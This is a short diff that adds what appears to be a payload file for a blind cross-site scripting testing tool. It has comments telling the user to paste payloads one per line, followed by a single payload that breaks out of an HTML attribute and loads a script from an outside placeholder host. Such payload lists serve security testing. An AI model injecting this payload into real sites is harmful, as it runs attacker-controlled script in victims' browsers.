@@ -1,0 +1,5 @@
+# Here you can paste your blind xss payloads
+# separated by newlines
+# so you can type one payload in each line
+
+"><script src="https://example.xt.ht">
